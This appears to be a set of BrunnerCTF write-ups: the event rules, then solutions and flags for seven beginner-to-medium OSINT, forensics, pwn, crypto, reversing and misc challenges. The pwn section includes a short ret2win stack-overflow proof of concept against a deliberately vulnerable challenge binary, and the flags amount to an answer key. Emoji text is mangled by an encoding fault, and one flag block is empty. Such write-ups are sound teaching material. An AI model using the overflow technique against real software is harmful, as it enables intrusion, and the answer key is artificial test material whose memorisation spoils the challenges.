## ü•ò About
Get ready all cyber chefs and code connoisseurs,  
Brunnerne has cooked up their very first BrunnerCTF for all of you to enjoy!

We have prepared a fresh batch of delicious challenges with all your favorite flavors:  
Web, forensics, rev, crypto, pwn, OSINT ‚Äî but perhaps also a few secret ingredients to surprise your palette!

The CTF is aimed mostly at home cooks with a bit of experience,  
but we have something for every taste: From an entire "Shake & Bake" category for those most comfortable sticking to instant noodles, to a few chef's specials that will challenge even the most experienced Masterchefs.

The CTF is online, and you can participate from anywhere in the world!

There are prizes for the top 10 Danish teams and 3 best writeups!

**Sponsors:**  
- [Campfire Security](https://campfiresecurity.dk)  
- [Bankdata](https://www.bankdata.dk)  
- [Cyberskills](https://www.cyberskills.dk)  
- [Hetzner](https://www.hetzner.com)  

## üìú Rules
- DO NOT share flags or collaborate with other teams during the competition.  
- DO NOT ask for or give help outside your team until the event has ended (this includes other teams who have solved the challenge).  
- DO NOT attack, harass, or interfere with other players in any way.  
- DO NOT hoard flags or delay submissions ("sandbagging").  
- DO NOT brute force infrastructure or flags. Some challenges require limited brute forcing, but never with enumeration tools like dirbuster. If in doubt, open a support ticket on Discord.  
- DO NOT create multiple accounts or teams.  
- DO NOT discriminate. We have a zero-tolerance policy for any form of discrimination, including but not limited to discrimination based on politics, gender, race, or sexual orientation. Discriminatory or political content in team names or usernames is not permitted and may be removed or hidden.  
- Please keep a respectful tone on Discord at all times - both towards organizers and other players.  
- Violations may result in disqualification; infrastructure abuse or attempted attacks will result in an immediate ban and possible police involvement.  
- There is no team size limit, but prizes are limited to 5 members per team.  
- Admins have the final word.

**Additional notes:**  
- All flags are in the format brunner{.*}.  
- Challenges use dynamic scoring (points decrease with the number of solves) except for Shake & Bake challenges, which are scored statically.  
- You are allowed to ask the organizers for hints for Shake & Bake challenges in a support ticket on Discord.  
- After the event, you are encouraged to publish writeups and share solutions on the Discord.  
- Rules may be updated at any time by the BrunnerCTF crew.

# Challenge: Traditional Cake
**Category:** OSINT  
**Difficulty:** Medium  
**Points:** 100  
**Author:** OddNorseman  
**Flag:** `brunner{inched.cases.entitle}`  

### üìù Description
A photo of a traditional cake‚Äôs location was given. The flag is the [what3words](https://what3words.com) code for the exact spot, wrapped in `brunner{}`.

### üîç Steps Taken
- Extracted the image and checked metadata with `exiftool` ‚Äî no GPS.  
- Observed pavilion across reflective lake; European palace garden style.  
- Identified as the **Apollotempel** in Nymphenburg Palace Park (Munich).  
- Located exact lakeside vantage across from temple.  
- what3words lookup gave `inched.cases.entitle`.  

### üèÅ Flag
```

brunner{inched.cases.entitle}

```

### üéì Lessons Learned
- Landmark recognition followed by vantage alignment yields correct w3w square.  
- Precision is critical; a single square offset yields a different code.

# Challenge: The Secret Brunsviger
**Category:** Forensics  
**Difficulty:** Beginner  
**Points:** 50  
**Author:** Ha1fdan  
**Flag:** `brunner{S3cr3t_Brunzv1g3r_R3c1p3_Fr0m_Gr4ndm4s_C00kb00k}`  

### üìù Description
Intercepted HTTPS traffic and a TLS key log were provided.

### üîç Steps Taken
- Opened `traffic.pcap` in Wireshark, configured TLS with `keys.log`.  
- Followed decrypted HTTP stream ‚Äî JSON contained base64 field.  
- Decoded base64 string with:  
    ```bash
    echo 'YnJ1bm5lcntTM2NyM3RfQnJ1bnp2aTNnM3JfUjNjMXAzX0ZyMG1fR3I0bmRtNHNfQzAwa2IwMGt9Aw30=' | base64 -d
    ```
- Output revealed flag.  

### üèÅ Flag
```

brunner{S3cr3t_Brunzv1g3r_R3c1p3_Fr0m_Gr4ndm4s_C00kb00k}

```

### üéì Lessons Learned
- Key log files make TLS traffic analysis straightforward.  
- Base64 encoding is a common layer in beginner challenges.

# Challenge: Dat Overflow Dough
**Category:** Pwn  
**Difficulty:** Beginner  
**Points:** 50  
**Author:** 0xjeppe  
**Flag:** `brunner{b1n4ry_eXpLoiTatioN_iS_CooL}`  

### üìù Description
Intern wrote a vulnerable recipe program in C.

### üîç Steps Taken
- Analyzed binary: non-PIE ELF, `secret_dough_recipe` at `0x4011b6`.  
- Vulnerability: `gets()` into 16-byte buffer, overwrite RET at offset 24.  
- Local PoC:  
    ```bash
    python3 - <<'PY' | ./recipe
    import struct, sys
    sys.stdout.buffer.write(b"A"*16 + b"B"*8 + struct.pack("<Q", 0x4011b6) + b"\n")
    PY
    ```
- Remote connection provided via `ncat --ssl`.  
- Used provided `exploit.py` with updated constants.  
- Ran script, flag printed successfully.  

### üèÅ Flag
```

brunner{b1n4ry_eXpLoiTatioN_iS_CooL}

```

### üéì Lessons Learned
- Non-PIE + unsafe input = ret2win opportunity.  
- Always calculate padding (buffer + saved RBP).

# Challenge: Shaken, Not Stirred
**Category:** Crypto  
**Difficulty:** Beginner  
**Points:** 50  
**Author:** Nissen  
**Flag:** `brunner{th3_n4m3's_Brunn3r...J4m3s_Brunn3r}`  

### üìù Description
Encrypted cocktail text to decrypt.

### üîç Steps Taken
- `encrypt.py` showed single-byte XOR scheme.  
- Extracted ciphertext from `output.txt`.  
- Brute-forced all keys with script:  
    ```python
    cipher_line = "wg`{{pgna}&J{!x&2fJWg`{{&g;;;_!x&fJWg`{{&gh".encode()
    for key in range(256):
        pt = bytes([b ^ key for b in cipher_line])
        try: s = pt.decode()
        except: continue
        if "{" in s and "}" in s:
            print(key, s)
    ```
- Key 21 gave clear flag text.  

### üèÅ Flag
```

brunner{th3_n4m3's_Brunn3r...J4m3s_Brunn3r}

```

### üéì Lessons Learned
- Cosmetic functions often distract; focus on actual transformation.  
- Single-byte XOR is trivial to brute-force.

# Challenge: Textopolis
**Category:** Reverse Engineering  
**Difficulty:** Beginner  
**Points:** 40  
**Author:** Quack  
**Flag:** `brunner{ü§ëü§óüòáüòõ‚ò∫‚ô´‚òº‚ô™‚ô†‚ô•‚ô£‚ô¶‚ò∫ü§îüòè‚Äºüòéü§Øü§†ü•≥üòµü•±ü§êü•µü•∂üëª}`  

### üìù Description
.NET emoji validation puzzle.

### üîç Steps Taken

- Checks discovered:  
  - Favorite emoji must be `‚Äº`.  
  - Passport = reversed array ‚Üí `‚ò∫‚ô´‚òº‚ô™‚ô†‚ô•‚ô£‚ô¶‚ò∫`.  
  - Name must include `‚åÇ¬ø‚ñ†`, exclude `‚ô£‚ô¶‚òª‚ô•`.  
- Flag construction script:  
    ```python
    emoji_passport = ["‚ò∫","‚ô¶","‚ô£","‚ô•","‚ô†","‚ô™","‚òº","‚ô´","‚ò∫"]
    emoji_passport.reverse()
    flag = f"brunner{{ü§ëü§óüòáüòõ{''.join(emoji_passport)}ü§îüòè‚Äºüòéü§Øü§†ü•≥üòµü•±ü§êü•µü•∂üëª}}"
    print(flag)
    ```

### üèÅ Flag
```

```

### üéì Lessons Learned
- ILSpy makes beginner .NET reversing straightforward.  
- Watch for in-place array mutations like `Array.Reverse`.

# Challenge: Digging For Treasure
**Category:** Forensics  
**Difficulty:** Beginner  
**Points:** 40  
**Author:** Emil8250  
**Flag:** `brunner{cu$t4rd_1z_k1ng}`  

### üìù Description
USB forensic image investigation.

### üîç Steps Taken
- Extracted `recipe_usb.E01`.  
- Loaded into Autopsy, viewed deleted files.  
- Found `do_not_open_this.txt` with password hint: `C0u1d_Th1S_B3_f0r_z1p?`.  
- Used password to open `f0005288.7z`:  
    ```bash
    7z x f0005288.7z -oextracted/secret/
    ```
- Inside: `flag.txt` revealed flag.  

### üèÅ Flag
```

brunner{cu$t4rd_1z_k1ng}

# Challenge: Insanity Check
**Category:** Misc  
**Difficulty:** Beginner  
**Points:** 30  
**Author:** OddNorseman  
**Flag:** `brunner{y0u_d1d_1t!!!_n0w_try_t0_4ctu4lly_pl4y_th3_ctf}`  

### üìù Description
Cursor-snapping insanity challenge.  
**Environment note:** Originally solved on Windows; re-done on macOS for documentation. Scripts below are macOS Quartz-based.

### üîç Steps Taken
- Initial sweep script (Windows) too slow.  
- Template matching (OpenCV) unreliable on macOS Retina.  
- ORB feature matching weak results.  
- Page-side JS attempt blocked by obfuscation.  
- Switched to color-based targeting with Quartz + `mss`.  
- Successfully hovered icon ‚Üí flag printed.  

### üèÅ Flag
```

brunner{y0u_d1d_1t!!!_n0w_try_t0_4ctu4lly_pl4y_th3_ctf}

```

### üéì Lessons Learned
- Color-based targeting outperforms template matching for small stylized icons.  
- macOS Quartz APIs are essential for precise cursor control.  
- Avoid int16 overflow by casting to int32 in NumPy.
